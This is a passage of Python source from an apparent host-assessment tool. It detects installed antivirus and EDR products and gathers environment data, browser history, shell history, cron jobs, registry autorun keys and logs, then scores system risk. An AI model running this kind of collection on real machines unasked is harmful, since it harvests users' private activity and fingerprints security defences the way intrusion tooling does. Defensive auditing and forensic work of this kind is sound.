            'editor': os.environ.get('EDITOR') or os.environ.get('VISUAL'),
            'home': os.environ.get('HOME'),
            'user': os.environ.get('USER') or os.environ.get('USERNAME'),
            'logname': os.environ.get('LOGNAME')
        }
        
        # Language/locale
        env_info['locale'] = {
            'lang': os.environ.get('LANG'),
            'language': os.environ.get('LANGUAGE'),
            'lc_all': os.environ.get('LC_ALL'),
            'lc_ctype': os.environ.get('LC_CTYPE'),
            'lc_messages': os.environ.get('LC_MESSAGES')
        }
        
        return env_info
    
    def _get_antivirus_info(self) -> Dict[str, Any]:
        """Get antivirus information"""
        logger.debug("[*] Detecting antivirus software")
        
        av_info = {
            'detected': [],
            'products': [],
            'processes_found': [],
            'registry_entries': [],
            'services': [],
            'windows_defender': None
        }
        
        try:
            # Common antivirus process names and their vendors
            av_processes = [
                ('avast', 'Avast', 'antivirus'),
                ('avg', 'AVG', 'antivirus'),
                ('avguard', 'Avira', 'antivirus'),
                ('bdagent', 'Bitdefender', 'antivirus'),
                ('kav', 'Kaspersky', 'antivirus'),
                ('mcafee', 'McAfee', 'antivirus'),
                ('msmpeng', 'Windows Defender', 'antivirus'),
                ('norton', 'Norton', 'antivirus'),
                ('symantec', 'Symantec', 'antivirus'),
                ('trend micro', 'Trend Micro', 'antivirus'),
                ('eset', 'ESET', 'antivirus'),
                ('malwarebytes', 'Malwarebytes', 'antimalware'),
                ('crowdstrike', 'CrowdStrike', 'edr'),
                ('carbon black', 'Carbon Black', 'edr'),
                ('sentinelone', 'SentinelOne', 'edr'),
                ('sophos', 'Sophos', 'antivirus'),
                ('panda', 'Panda', 'antivirus'),
                ('webroot', 'Webroot', 'antivirus'),
                ('vipre', 'VIPRE', 'antivirus'),
                ('cylance', 'Cylance', 'edr')
            ]
            
            # Check running processes
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    proc_name = proc.info['name'].lower()
                    for av_keyword, av_name, av_type in av_processes:
                        if av_keyword in proc_name:
                            av_info['processes_found'].append({
                                'name': av_name,
                                'process': proc_name,
                                'pid': proc.pid,
                                'type': av_type,
                                'vendor': av_name
                            })
                            break
                except:
                    continue
            
            # Windows-specific AV detection
            if platform.system() == 'Windows':
                # Check Windows Security Center via WMI
                try:
                    import wmi
                    c = wmi.WMI(namespace="root\\SecurityCenter2")
                    
                    # Antivirus products
                    for av in c.AntiVirusProduct():
                        av_info['products'].append({
                            'name': av.displayName,
                            'state': av.productState,
                            'timestamp': av.timestamp if hasattr(av, 'timestamp') else None,
                            'source': 'WMI SecurityCenter2'
                        })
                    
                    # Firewall products
                    for fw in c.FirewallProduct():
                        av_info['products'].append({
                            'name': fw.displayName,
                            'state': fw.productState,
                            'type': 'firewall',
                            'source': 'WMI SecurityCenter2'
                        })
                    
                    # AntiSpyware products
                    for asw in c.AntiSpywareProduct():
                        av_info['products'].append({
                            'name': asw.displayName,
                            'state': asw.productState,
                            'type': 'antispyware',
                            'source': 'WMI SecurityCenter2'
                        })
                        
                except Exception as e:
                    logger.debug(f"[!] WMI SecurityCenter2 error: {e}")
                
                # Check registry for antivirus
                try:
                    import winreg
                    
                    # Common AV registry locations
                    av_registry_paths = [
                        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
                        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
                        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender"),
                        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows Defender"),
                        (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services")
                    ]
                    
                    for root, base_path in av_registry_paths:
                        try:
                            key = winreg.OpenKey(root, base_path)
                            
                            # Different handling for different registry paths
                            if 'Services' in base_path:
                                # Service keys
                                for i in range(winreg.QueryInfoKey(key)[0]):
                                    try:
                                        service_name = winreg.EnumKey(key, i)
                                        service_key = winreg.OpenKey(key, service_name)
                                        
                                        try:
                                            image_path = winreg.QueryValueEx(service_key, 'ImagePath')[0]
                                            if any(av_keyword in image_path.lower() for av_keyword, _, _ in av_processes):
                                                av_info['services'].append({
                                                    'service': service_name,
                                                    'image_path': image_path,
                                                    'source': 'registry_services'
                                                })
                                        except:
                                            pass
                                        
                                        winreg.CloseKey(service_key)
                                    except:
                                        continue
                            else:
                                # Uninstall/Software keys
                                for i in range(winreg.QueryInfoKey(key)[0]):
                                    try:
                                        subkey_name = winreg.EnumKey(key, i)
                                        subkey = winreg.OpenKey(key, subkey_name)
                                        
                                        try:
                                            display_name = winreg.QueryValueEx(subkey, 'DisplayName')[0]
                                            publisher = winreg.QueryValueEx(subkey, 'Publisher')[0] if winreg.QueryValueEx(subkey, 'Publisher') else ''
                                            
                                            # Check if it's security software
                                            av_keywords = [
                                                'antivirus', 'security', 'defender', 'protection',
                                                'avast', 'avg', 'kaspersky', 'mcafee', 'norton',
                                                'symantec', 'trend', 'eset', 'malware', 'bitdefender',
                                                'panda', 'sophos', 'webroot', 'vipre'
                                            ]
                                            
                                            if any(keyword in display_name.lower() for keyword in av_keywords):
                                                av_info['registry_entries'].append({
                                                    'name': display_name,
                                                    'publisher': publisher,
                                                    'install_location': winreg.QueryValueEx(subkey, 'InstallLocation')[0] if winreg.QueryValueEx(subkey, 'InstallLocation') else '',
                                                    'uninstall_string': winreg.QueryValueEx(subkey, 'UninstallString')[0] if winreg.QueryValueEx(subkey, 'UninstallString') else '',
                                                    'source': 'registry_uninstall'
                                                })
                                        except:
                                            pass
                                        
                                        winreg.CloseKey(subkey)
                                    except:
                                        continue
                            
                            winreg.CloseKey(key)
                        except:
                            continue
                
                except Exception as e:
                    logger.debug(f"[!] Registry AV detection error: {e}")
                
                # Check Windows Defender specifically
                try:
                    import winreg
                    defender_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows Defender")
                    
                    defender_info = {}
                    try:
                        defender_info['version'] = winreg.QueryValueEx(defender_key, "ProductVersion")[0]
                    except:
                        pass
                    
                    try:
                        defender_info['install_location'] = winreg.QueryValueEx(defender_key, "InstallLocation")[0]
                    except:
                        pass
                    
                    # Check real-time protection status
                    try:
                        realtime_key = winreg.OpenKey(defender_key, "Real-Time Protection")
                        try:
                            defender_info['realtime_enabled'] = bool(winreg.QueryValueEx(realtime_key, "DisableRealtimeMonitoring")[0] == 0)
                        except:
                            pass
                        winreg.CloseKey(realtime_key)
                    except:
                        pass
                    
                    winreg.CloseKey(defender_key)
                    
                    if defender_info:
                        av_info['windows_defender'] = defender_info
                        
                except:
                    pass
            
            # Linux-specific AV detection
            elif platform.system() == 'Linux':
                # Check for ClamAV
                try:
                    result = subprocess.run(['clamscan', '--version'], capture_output=True, text=True)
                    if result.returncode == 0:
                        version_match = re.search(r'ClamAV (\d+\.\d+\.\d+)', result.stdout)
                        if version_match:
                            av_info['detected'].append({
                                'name': 'ClamAV',
                                'version': version_match.group(1),
                                'type': 'antivirus',
                                'source': 'clamscan'
                            })
                except:
                    pass
                
                # Check for rkhunter/chkrootkit
                for tool in ['rkhunter', 'chkrootkit']:
                    try:
                        result = subprocess.run(['which', tool], capture_output=True, text=True)
                        if result.returncode == 0:
                            av_info['detected'].append({
                                'name': tool.capitalize(),
                                'path': result.stdout.strip(),
                                'type': 'rootkit_scanner',
                                'source': 'which'
                            })
                    except:
                        pass
                
                # Check for SELinux/AppArmor
                try:
                    # SELinux
                    if os.path.exists('/usr/sbin/sestatus'):
                        result = subprocess.run(['sestatus'], capture_output=True, text=True)
                        if 'SELinux status' in result.stdout:
                            av_info['detected'].append({
                                'name': 'SELinux',
                                'status': 'enabled' if 'enabled' in result.stdout else 'disabled',
                                'type': 'mandatory_access_control',
                                'source': 'sestatus'
                            })
                    
                    # AppArmor
                    if os.path.exists('/sys/module/apparmor/parameters/enabled'):
                        with open('/sys/module/apparmor/parameters/enabled', 'r') as f:
                            if 'Y' in f.read():
                                av_info['detected'].append({
                                    'name': 'AppArmor',
                                    'status': 'enabled',
                                    'type': 'mandatory_access_control',
                                    'source': 'sysfs'
                                })
                except:
                    pass
            
            # macOS-specific AV detection
            elif platform.system() == 'Darwin':
                # Check for XProtect (macOS built-in)
                try:
                    xprotect_path = '/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/XProtect.meta.plist'
                    if os.path.exists(xprotect_path):
                        av_info['detected'].append({
                            'name': 'XProtect',
                            'type': 'antimalware',
                            'source': 'system'
                        })
                except:
                    pass
                
                # Check for Gatekeeper
                try:
                    result = subprocess.run(['spctl', '--status'], capture_output=True, text=True)
                    if 'assessments enabled' in result.stdout:
                        av_info['detected'].append({
                            'name': 'Gatekeeper',
                            'status': 'enabled',
                            'type': 'runtime_protection',
                            'source': 'spctl'
                        })
                except:
                    pass
                
                # Check for Little Snitch (popular macOS firewall)
                try:
                    if os.path.exists('/Applications/Little Snitch.app'):
                        av_info['detected'].append({
                            'name': 'Little Snitch',
                            'type': 'firewall',
                            'source': 'application_bundle'
                        })
                except:
                    pass
            
            # Consolidate findings
            all_findings = []
            
            # Add processes
            for proc in av_info['processes_found']:
                all_findings.append({
                    'name': proc['name'],
                    'type': proc['type'],
                    'vendor': proc['vendor'],
                    'detection_method': 'process',
                    'confidence': 'high'
                })
            
            # Add products from WMI
            for product in av_info['products']:
                all_findings.append({
                    'name': product['name'],
                    'type': product.get('type', 'antivirus'),
                    'detection_method': 'WMI',
                    'confidence': 'high'
                })
            
            # Add registry entries
            for reg_entry in av_info['registry_entries']:
                all_findings.append({
                    'name': reg_entry['name'],
                    'type': 'antivirus',
                    'detection_method': 'registry',
                    'confidence': 'medium'
                })
            
            # Remove duplicates
            unique_findings = []
            seen_names = set()
            
            for finding in all_findings:
                if finding['name'] not in seen_names:
                    unique_findings.append(finding)
                    seen_names.add(finding['name'])
            
            av_info['detected'] = unique_findings
            
            # Summary
            av_info['summary'] = {
                'total_detected': len(unique_findings),
                'has_antivirus': len([f for f in unique_findings if f['type'] == 'antivirus']) > 0,
                'has_firewall': len([f for f in unique_findings if f['type'] == 'firewall']) > 0,
                'has_edr': len([f for f in unique_findings if f['type'] == 'edr']) > 0,
                'has_mac': len([f for f in unique_findings if 'mandatory_access_control' in f.get('type', '')]) > 0
            }
        
        except Exception as e:
            logger.error(f"[!] Antivirus detection error: {e}")
            av_info['error'] = str(e)
        
        return av_info
    
    def _get_forensic_artifacts(self) -> Dict[str, Any]:
        """Collect forensic artifacts"""
        logger.debug("[*] Collecting forensic artifacts")
        
        artifacts = {
            'system_logs': [],
            'application_logs': [],
            'browser_history': [],
            'recent_documents': [],
            'prefetch_files': [],
            'event_logs': [],
            'shell_history': [],
            'registry_artifacts': [],
            'memory_artifacts': [],
            'disk_artifacts': []
        }
        
        try:
            if platform.system() == 'Windows':
                artifacts.update(self._get_windows_forensic_artifacts())
            elif platform.system() == 'Linux':
                artifacts.update(self._get_linux_forensic_artifacts())
            elif platform.system() == 'Darwin':
                artifacts.update(self._get_macos_forensic_artifacts())
        
        except Exception as e:
            logger.error(f"[!] Forensic artifacts error: {e}")
            artifacts['error'] = str(e)
        
        # Add summary
        artifacts['summary'] = {
            'total_artifacts': sum(len(v) for v in artifacts.values() if isinstance(v, list)),
            'categories_with_data': len([k for k, v in artifacts.items() if isinstance(v, list) and v]),
            'collection_status': 'partial' if artifacts.get('error') else 'complete'
        }
        
        return artifacts
    
    def _get_windows_forensic_artifacts(self) -> Dict[str, Any]:
        """Get Windows forensic artifacts"""
        artifacts = {}
        
        try:
            # Windows Event Logs
            try:
                artifacts['event_logs'] = self._get_windows_event_logs()
            except:
                pass
            
            # Prefetch files
            prefetch_path = r'C:\Windows\Prefetch'
            if os.path.exists(prefetch_path):
                try:
                    prefetch_files = []
                    for file in os.listdir(prefetch_path)[:50]:  # Limit to 50
                        if file.endswith('.pf'):
                            file_path = os.path.join(prefetch_path, file)
                            try:
                                stat = os.stat(file_path)
                                prefetch_files.append({
                                    'name': file,
                                    'size': stat.st_size,
                                    'modified': stat.st_mtime,
                                    'accessed': stat.st_atime
                                })
                            except:
                                prefetch_files.append({'name': file})
                    
                    artifacts['prefetch_files'] = prefetch_files
                except:
                    pass
            
            # Recent documents
            recent_paths = [
                os.path.join(os.environ['USERPROFILE'], 'Recent'),
                os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Recent'),
                os.path.join(os.environ['APPDATA'], 'Microsoft', 'Office', 'Recent')
            ]
            
            recent_docs = []
            for recent_path in recent_paths:
                if os.path.exists(recent_path):
                    try:
                        for item in os.listdir(recent_path)[:30]:  # Limit per folder
                            item_path = os.path.join(recent_path, item)
                            if os.path.isfile(item_path):
                                try:
                                    stat = os.stat(item_path)
                                    recent_docs.append({
                                        'name': item,
                                        'path': item_path,
                                        'size': stat.st_size,
                                        'modified': stat.st_mtime
                                    })
                                except:
                                    recent_docs.append({
                                        'name': item,
                                        'path': item_path
                                    })
                    except:
                        pass
            
            artifacts['recent_documents'] = recent_docs[:50]  # Overall limit
            
            # Browser history (simplified)
            artifacts['browser_history'] = self._get_browser_history()
            
            # Registry artifacts
            try:
                artifacts['registry_artifacts'] = self._get_windows_registry_artifacts()
            except:
                pass
            
            # Application logs
            appdata_path = os.path.join(os.environ['APPDATA'], '..', 'Local')
            app_logs = []
            
            try:
                for root, dirs, files in os.walk(appdata_path):
                    for file in files:
                        if file.endswith('.log'):
                            log_path = os.path.join(root, file)
                            try:
                                stat = os.stat(log_path)
                                if stat.st_size < 1024 * 1024:  # Less than 1MB
                                    app_logs.append({
                                        'path': log_path,
                                        'size': stat.st_size,
                                        'modified': stat.st_mtime
                                    })
                                
                                if len(app_logs) >= 50:
                                    break
                            except:
                                pass
                    
                    if len(app_logs) >= 50:
                        break
            except:
                pass
            
            artifacts['application_logs'] = app_logs
            
            # System logs
            system_logs = []
            log_paths = [
                r'C:\Windows\System32\winevt\Logs',
                r'C:\Windows\Logs',
                r'C:\Windows\Panther',
                r'C:\Windows\inf'
            ]
            
            for log_path in log_paths:
                if os.path.exists(log_path):
                    try:
                        for root, dirs, files in os.walk(log_path):
                            for file in files:
                                if any(file.endswith(ext) for ext in ['.log', '.evtx', '.etl']):
                                    file_path = os.path.join(root, file)
                                    system_logs.append({
                                        'path': file_path,
                                        'name': file
                                    })
                                    
                                    if len(system_logs) >= 30:
                                        break
                            
                            if len(system_logs) >= 30:
                                break
                    except:
                        pass
            
            artifacts['system_logs'] = system_logs[:30]
            
            # Shell history
            artifacts['shell_history'] = self._get_shell_history()
        
        except Exception as e:
            logger.error(f"[!] Windows forensic artifacts error: {e}")
        
        return artifacts
    
    def _get_windows_event_logs(self) -> List[Dict[str, Any]]:
        """Get Windows event logs"""
        event_logs = []
        
        try:
            import win32evtlog
            
            # Common event logs to check
            log_types = ['Application', 'System', 'Security', 'Setup', 
                        'ForwardedEvents', 'Windows PowerShell']
            
            for log_type in log_types:
                try:
                    hand = win32evtlog.OpenEventLog(None, log_type)
                    flags = win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ
                    events = win32evtlog.ReadEventLog(hand, flags, 0)
                    
                    log_events = []
                    for event in events[:5]:  # First 5 events of each type
                        event_info = {
                            'time_generated': str(event.TimeGenerated),
                            'source_name': event.SourceName,
                            'event_id': event.EventID,
                            'event_type': event.EventType,
                            'computer': event.ComputerName
                        }
                        
                        # Add message if available
                        if event.StringInserts:
                            # Join string inserts and limit length
                            message = ' '.join([str(s) for s in event.StringInserts])
                            event_info['message'] = message[:500] + '...' if len(message) > 500 else message
                        
                        log_events.append(event_info)
                    
                    event_logs.append({
                        'log_type': log_type,
                        'event_count': len(log_events),
                        'events': log_events
                    })
                    
                    win32evtlog.CloseEventLog(hand)
                    
                except Exception as e:
                    logger.debug(f"[!] Event log {log_type} error: {e}")
                    continue
        
        except Exception as e:
            logger.error(f"[!] Windows event logs error: {e}")
        
        return event_logs
    
    def _get_windows_registry_artifacts(self) -> List[Dict[str, Any]]:
        """Get Windows registry artifacts"""
        registry_artifacts = []
        
        try:
            import winreg
            
            # Common registry artifacts locations
            artifact_locations = [
                # Run keys
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\RunOnce"),
                
                # Browser helper objects
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects"),
                (winreg.HKEY_CURRENT_USER, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects"),
                
                # Startup folders registry
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders"),
                
                # AppInit DLLs
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows", "AppInit_DLLs"),
                
                # Known DLLs
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"),
                
                # Shell extensions
                (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Shell Extensions\Approved"),
                
                # Network connections
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Internet Settings\Connections"),
                
                # Typed URLs
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Internet Explorer\TypedURLs"),
                
                # Recent docs
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"),
                
                # UserAssist (encoded)
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"),
            ]
            
            for root, path, *value_name in artifact_locations:
                try:
                    if value_name:
                        # Single value
                        key = winreg.OpenKey(root, path)
                        value, value_type = winreg.QueryValueEx(key, value_name[0])
                        winreg.CloseKey(key)
                        
                        registry_artifacts.append({
                            'location': f"{'HKCU' if root == winreg.HKEY_CURRENT_USER else 'HKLM'}\\{path}",
                            'value': value_name[0],
                            'data': str(value)[:200],  # Limit length
                            'type': 'single_value'
                        })
                    else:
                        # Key with multiple values
                        key = winreg.OpenKey(root, path)
                        
                        values = []
                        i = 0
                        while True:
                            try:
                                name, value, value_type = winreg.EnumValue(key, i)
                                values.append({
                                    'name': name,
                                    'data': str(value)[:100]  # Limit length
                                })
                                i += 1
                            except OSError:
                                break
                        
                        winreg.CloseKey(key)
                        
                        if values:
                            registry_artifacts.append({
                                'location': f"{'HKCU' if root == winreg.HKEY_CURRENT_USER else 'HKLM'}\\{path}",
                                'values': values[:10],  # Limit to 10 values per key
                                'type': 'multiple_values'
                            })
                            
                except Exception as e:
                    logger.debug(f"[!] Registry artifact {path} error: {e}")
                    continue
        
        except Exception as e:
            logger.error(f"[!] Registry artifacts error: {e}")
        
        return registry_artifacts
    
    def _get_linux_forensic_artifacts(self) -> Dict[str, Any]:
        """Get Linux forensic artifacts"""
        artifacts = {}
        
        try:
            # System logs
            system_logs = []
            log_files = [
                '/var/log/syslog',
                '/var/log/auth.log',
                '/var/log/kern.log',
                '/var/log/dmesg',
                '/var/log/secure',
                '/var/log/messages',
                '/var/log/audit/audit.log'
            ]
            
            for log_file in log_files:
                if os.path.exists(log_file):
                    try:
                        stat = os.stat(log_file)
                        system_logs.append({
                            'path': log_file,
                            'size': stat.st_size,
                            'modified': stat.st_mtime,
                            'accessible': os.access(log_file, os.R_OK)
                        })
                    except:
                        pass
            
            artifacts['system_logs'] = system_logs
            
            # Shell history
            artifacts['shell_history'] = self._get_shell_history()
            
            # Cron jobs
            cron_artifacts = []
            
            # User crontab
            try:
                result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
                if result.returncode == 0:
                    cron_artifacts.append({
                        'type': 'user_crontab',
                        'user': getpass.getuser(),
                        'content': result.stdout[:500]
                    })
            except:
                pass
            
            # System crontabs
            cron_paths = [
                '/etc/crontab',
                '/etc/cron.d/',
                '/etc/cron.hourly/',
                '/etc/cron.daily/',
                '/etc/cron.weekly/',
                '/etc/cron.monthly/'
            ]
            
            for cron_path in cron_paths:
                if os.path.exists(cron_path):
                    if os.path.isfile(cron_path):
                        try:
                            with open(cron_path, 'r') as f:
                                content = f.read(500)
                                cron_artifacts.append({
                                    'type': 'system_cron',
                                    'path': cron_path,
                                    'content': content
                                })
                        except:
                            pass
                    elif os.path.isdir(cron_path):
                        try:
                            for item in os.listdir(cron_path):
                                item_path = os.path.join(cron_path, item)
                                if os.path.isfile(item_path):
                                    cron_artifacts.append({
                                        'type': 'cron_script',
                                        'path': item_path,
                                        'name': item
                                    })
                        except:
                            pass
            
            artifacts['cron_jobs'] = cron_artifacts
            
            # Recent commands from shell history
            recent_commands = []
            try:
                # Get last 20 commands from history
                history_cmds = []
                
                # Try to get from HISTFILE environment variable
                histfile = os.environ.get('HISTFILE', '')
                if histfile and os.path.exists(histfile):
                    with open(histfile, 'r', encoding='utf-8', errors='ignore') as f:
                        history_cmds = f.readlines()[-20:]
                
                # Fallback to .bash_history
                if not history_cmds:
                    bash_history = os.path.expanduser('~/.bash_history')
                    if os.path.exists(bash_history):
                        with open(bash_history, 'r', encoding='utf-8', errors='ignore') as f:
                            history_cmds = f.readlines()[-20:]
                
                for cmd in history_cmds:
                    cmd = cmd.strip()
                    if cmd:
                        recent_commands.append(cmd)
            except:
                pass
            
            artifacts['recent_commands'] = recent_commands
            
            # Browser history
            artifacts['browser_history'] = self._get_browser_history()
            
            # Recent documents (from various locations)
            recent_docs = []
            recent_locations = [
                os.path.expanduser('~/.local/share/recently-used.xbel'),
                os.path.expanduser('~/.recently-used'),
                os.path.expanduser('~/Desktop'),
                os.path.expanduser('~/Downloads')
            ]
            
            for location in recent_locations:
                if os.path.exists(location):
                    if os.path.isfile(location):
                        try:
                            stat = os.stat(location)
                            recent_docs.append({
                                'path': location,
                                'type': 'file',
                                'modified': stat.st_mtime
                            })
                        except:
                            pass
                    elif os.path.isdir(location):
                        try:
                            for item in os.listdir(location)[:10]:  # First 10 items
                                item_path = os.path.join(location, item)
                                if os.path.isfile(item_path):
                                    try:
                                        stat = os.stat(item_path)
                                        recent_docs.append({
                                            'path': item_path,
                                            'name': item,
                                            'type': 'file',
                                            'modified': stat.st_mtime
                                        })
                                    except:
                                        recent_docs.append({
                                            'path': item_path,
                                            'name': item,
                                            'type': 'file'
                                        })
                        except:
                            pass
            
            artifacts['recent_documents'] = recent_docs[:50]
        
        except Exception as e:
            logger.error(f"[!] Linux forensic artifacts error: {e}")
        
        return artifacts
    
    def _get_macos_forensic_artifacts(self) -> Dict[str, Any]:
        """Get macOS forensic artifacts"""
        artifacts = {}
        
        try:
            # System logs
            system_logs = []
            log_dirs = [
                '/var/log',
                '/Library/Logs',
                '~/Library/Logs'
            ]
            
            for log_dir in log_dirs:
                expanded_dir = os.path.expanduser(log_dir)
                if os.path.exists(expanded_dir):
                    try:
                        for root, dirs, files in os.walk(expanded_dir):
                            for file in files:
                                if file.endswith('.log'):
                                    file_path = os.path.join(root, file)
                                    try:
                                        stat = os.stat(file_path)
                                        system_logs.append({
                                            'path': file_path,
                                            'size': stat.st_size,
                                            'modified': stat.st_mtime
                                        })
                                    except:
                                        system_logs.append({
                                            'path': file_path
                                        })
                                    
                                    if len(system_logs) >= 50:
                                        break
                            
                            if len(system_logs) >= 50:
                                break
                    except:
                        pass
            
            artifacts['system_logs'] = system_logs[:50]
            
            # Shell history
            artifacts['shell_history'] = self._get_shell_history()
            
            # Launch agents/daemons
            launch_artifacts = []
            launch_paths = [
                '/Library/LaunchDaemons',
                '/Library/LaunchAgents',
                os.path.expanduser('~/Library/LaunchAgents'),
                '/System/Library/LaunchDaemons',
                '/System/Library/LaunchAgents'
            ]
            
            for launch_path in launch_paths:
                if os.path.exists(launch_path):
                    try:
                        for item in os.listdir(launch_path):
                            if item.endswith('.plist'):
                                item_path = os.path.join(launch_path, item)
                                launch_artifacts.append({
                                    'path': item_path,
                                    'name': item,
                                    'type': 'launchd'
                                })
                    except:
                        pass
            
            artifacts['launch_agents'] = launch_artifacts
            
            # Browser history
            artifacts['browser_history'] = self._get_browser_history()
            
            # Recent items
            recent_items = []
            
            # Check for recently opened documents
            recent_paths = [
                os.path.expanduser('~/Library/Application Support/com.apple.sharedfilelist/'),
                os.path.expanduser('~/Library/Preferences/com.apple.recentitems.plist'),
                os.path.expanduser('~/Library/Recent Items/')
            ]
            
            for recent_path in recent_paths:
                if os.path.exists(recent_path):
                    if os.path.isfile(recent_path):
                        recent_items.append({
                            'path': recent_path,
                            'type': 'recent_items_file'
                        })
                    elif os.path.isdir(recent_path):
                        try:
                            for item in os.listdir(recent_path)[:10]:
                                item_path = os.path.join(recent_path, item)
                                recent_items.append({
                                    'path': item_path,
                                    'name': item,
                                    'type': 'recent_item'
                                })
                        except:
                            pass
            
            artifacts['recent_items'] = recent_items
        
        except Exception as e:
            logger.error(f"[!] macOS forensic artifacts error: {e}")
        
        return artifacts
    
    def _get_browser_history(self) -> List[Dict[str, Any]]:
        """Get browser history"""
        history = []
        
        try:
            # Chrome history
            chrome_paths = []
            
            if platform.system() == 'Windows':
                chrome_paths.append(
                    os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Default', 'History')
                )
                chrome_paths.append(
                    os.path.join(os.environ.get('LOCALAPPDATA', ''), 'Google', 'Chrome', 'User Data', 'Profile 1', 'History')
                )
            elif platform.system() == 'Linux':
                chrome_paths.append(os.path.expanduser('~/.config/google-chrome/Default/History'))
                chrome_paths.append(os.path.expanduser('~/.config/google-chrome/Profile 1/History'))
            elif platform.system() == 'Darwin':
                chrome_paths.append(os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/History'))
                chrome_paths.append(os.path.expanduser('~/Library/Application Support/Google/Chrome/Profile 1/History'))
            
            for chrome_path in chrome_paths:
                if os.path.exists(chrome_path):
                    try:
                        import sqlite3
                        import shutil
                        
                        # Copy the database to avoid locking issues
                        temp_db = chrome_path + '_temp'
                        shutil.copy2(chrome_path, temp_db)
                        
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        
                        # Get recent history
                        cursor.execute("""
                            SELECT url, title, last_visit_time, visit_count 
                            FROM urls 
                            ORDER BY last_visit_time DESC 
                            LIMIT 20
                        """)
                        
                        for row in cursor.fetchall():
                            history.append({
                                'browser': 'Chrome',
                                'url': row[0][:200],  # Limit URL length
                                'title': row[1][:100] if row[1] else '',  # Limit title length
                                'last_visit': row[2],
                                'visit_count': row[3]
                            })
                        
                        conn.close()
                        os.remove(temp_db)
                        
                    except Exception as e:
                        logger.debug(f"[!] Chrome history error: {e}")
        
        except Exception as e:
            logger.error(f"[!] Browser history error: {e}")
        
        return history
    
    def _run_security_scan(self) -> Dict[str, Any]:
        """Run security scan with multiple detectors"""
        logger.debug("[*] Running security scan")
        
        security_scan = {
            'detectors_run': [],
            'findings': [],
            'risk_factors': [],
            'overall_risk': 'UNKNOWN',
            'confidence': 'LOW'
        }
        
        try:
            # Run all detectors
            for detector_name, detector_func in self.detectors.items():
                try:
                    result = detector_func()
                    if result:
                        security_scan['detectors_run'].append(detector_name)
                        security_scan['findings'].extend(result.get('findings', []))
                        security_scan['risk_factors'].extend(result.get('risk_factors', []))
                except Exception as e:
                    logger.debug(f"[!] Detector {detector_name} error: {e}")
            
            # Calculate overall risk
            risk_score = 0
            risk_factors = security_scan['risk_factors']
            
            # Score risk factors
            for factor in risk_factors:
                if factor.get('severity') == 'CRITICAL':
                    risk_score += 40
                elif factor.get('severity') == 'HIGH':
                    risk_score += 25
                elif factor.get('severity') == 'MEDIUM':
                    risk_score += 15
                elif factor.get('severity') == 'LOW':
                    risk_score += 5
            
            # Determine overall risk
            if risk_score >= 70:
                security_scan['overall_risk'] = 'CRITICAL'
                security_scan['confidence'] = 'HIGH'
            elif risk_score >= 50:
                security_scan['overall_risk'] = 'HIGH'
                security_scan['confidence'] = 'MEDIUM'
            elif risk_score >= 30:
                security_scan['overall_risk'] = 'MEDIUM'
                security_scan['confidence'] = 'MEDIUM'
            elif risk_score >= 10:
                security_scan['overall_risk'] = 'LOW'
                security_scan['confidence'] = 'LOW'
            else:
                security_scan['overall_risk'] = 'SAFE'
                security_scan['confidence'] = 'LOW'
            
            security_scan['risk_score'] = risk_score
            
            # Add timestamp
            security_scan['timestamp'] = datetime.datetime.now().isoformat()
            
            # Generate security findings for dashboard
            if security_scan['findings']:
                self.security_findings = security_scan['findings']
        
        except Exception as e:
            logger.error(f"[!] Security scan error: {e}")
            security_scan['error'] = str(e)
        
        return security_scan
    
    def _detect_antivirus(self) -> Dict[str, Any]:
        """Detect antivirus software"""
        av_info = self._get_antivirus_info()
        
        findings = []
        risk_factors = []
        
        # Check if antivirus is present
        if not av_info['summary']['has_antivirus']:
            findings.append({
                'severity': 'HIGH',
                'category': 'Security',
                'description': 'No antivirus software detected',
                'evidence': ['No antivirus processes found', 'No antivirus registry entries']
            })
            risk_factors.append({
                'severity': 'HIGH',
                'factor': 'No antivirus protection',
                'impact': 'System vulnerable to malware'
            })
        else:
            findings.append({
                'severity': 'LOW',
                'category': 'Security',
